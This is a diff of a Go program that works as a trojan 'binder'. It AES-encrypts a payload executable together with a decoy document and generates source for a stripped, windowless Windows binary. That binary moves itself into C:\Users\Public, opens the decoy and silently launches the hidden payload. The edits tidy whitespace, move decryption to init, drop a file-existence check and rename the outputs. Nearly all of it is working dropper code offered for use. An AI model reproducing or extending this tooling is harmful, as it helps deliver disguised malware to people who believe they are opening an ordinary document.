@@ -2,7 +2,7 @@ package main
 
 import (
 	"bytes"
-	"crypto/aes" 
+	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
 	"fmt"
@@ -31,7 +31,7 @@ var (
 	`
 )
 
-func RandStr(length int) string {  
+func RandStr(length int) string {
 	str := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 	bytes := []byte(str)
 	result := []byte{}
@@ -47,7 +47,7 @@ func main() {
 	fmt.Println(tvb)
 	if len(os.Args) != 3 {
 		fmt.Println(keytishi)
-		return 
+		return
 	}
 	mumafile := os.Args[1]
 	docfile := os.Args[2]
@@ -80,23 +80,25 @@ func main() {
 		docfile = "%s"
 		
 		numafile = "%s"
+		dstFile    = "\\Users\\Public\\Yihsiwei.DAT"
+		selfile, _ = os.Executable()
+		ddocfile = AesDecrypt(docfile, key)
+
+		dmumafile = AesDecrypt(numafile, key)
 	)
 	
 	func main() {
-	
-		dstFile := "\\Users\\Public\\Yihsiwei.DAT"
-		selfile, _ := os.Executable()
 		panfu := selfile[0:2]
 		if !strings.Contains(selfile, "C:") {
 	
-			dstFile = panfu + "\\CWAWF.DAT"
+			dstFile = panfu + "\\Yihsiwei.DAT"
 		} else {
 			dstFile = panfu + dstFile
 		}
 
 		os.Rename(selfile, dstFile)
 
-		ddocfile := AesDecrypt(docfile, key)
+
 		f2, _ := os.Create(docfilename)
 		_, _ = f2.Write([]byte(ddocfile))
 		f2.Close()
@@ -107,18 +109,17 @@ func main() {
 		_ = cmd.Start()
 		var dstFilecc = "C:\\Users\\Public\\" + mumafilename
 		f, _ := os.Create(dstFilecc)
-		dmumafile := AesDecrypt(numafile, key)
 		_, _ = f.Write([]byte(dmumafile))
 		f.Close()
 
-		_, err := os.Stat(dstFilecc)
+		//_, err := os.Stat(dstFilecc)
 	
-		if err == nil {
+		//if err == nil {
 	
 			cmda := exec.Command(dstFilecc)
 			_ = cmda.Start()
 	
-		}
+		//}
 	
 	}
 	
@@ -140,25 +141,25 @@ func main() {
 	}
 	`, key, mumafile, docfile, "\\\\"+docfile, AesdocfileStr, AesmumafileStr)
 
-	f, _ := os.Create("outfile.go")
+	f, _ := os.Create("Yihsiwei.go")
 
 	_, _ = f.Write([]byte(SourceCode))
 	f.Close()
 
-	exitfile("outfile.go")
+	exitfile("Yihsiwei.go")
 	time.Sleep(time.Duration(1) * time.Second)
 
 	batfile, _ := os.Create("Yihsiwei.bat")
 
-	_, _ = batfile.Write([]byte("go build -ldflags \"-H=windowsgui\" outfile.go"))
+	_, _ = batfile.Write([]byte("go build -ldflags \"-w -s -H=windowsgui\" Yihsiwei.go"))
 	batfile.Close()
 	exitfile("Yihsiwei.bat")
 	time.Sleep(time.Duration(1) * time.Second)
 	cmd := exec.Command("Yihsiwei.bat")
 	_ = cmd.Start()
 
-	exitfile("outfile.exe")
-	os.RemoveAll("outfile.go")
+	exitfile("Yihsiwei.exe")
+	os.RemoveAll("Yihsiwei.go")
 	os.RemoveAll("Yihsiwei.bat")
 
 }
